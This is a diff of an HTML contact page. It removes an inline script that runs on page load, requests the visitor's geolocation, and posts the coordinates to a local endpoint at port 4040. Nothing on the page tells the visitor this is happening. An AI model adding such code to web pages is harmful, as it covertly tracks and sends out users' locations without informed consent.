@@ -40,30 +40,6 @@
             <p><strong>Phone:</strong> +91 7024026932</p>
         </div>
     </div>
-    <script>
-        function sendLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    let latitude = position.coords.latitude;
-                    let longitude = position.coords.longitude;
-    
-                    fetch("http://127.0.0.1:4040   ", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ latitude: latitude, longitude: longitude })
-                    })
-                    .then(response => response.json())
-                    .then(data => console.log("Location sent:", data))
-                    .catch(error => console.error("Error:", error));
-                });
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
-        }
-    
-        // Send location when the page loads
-        window.onload = sendLocation;
-    </script>
     
 </body>
 </html>
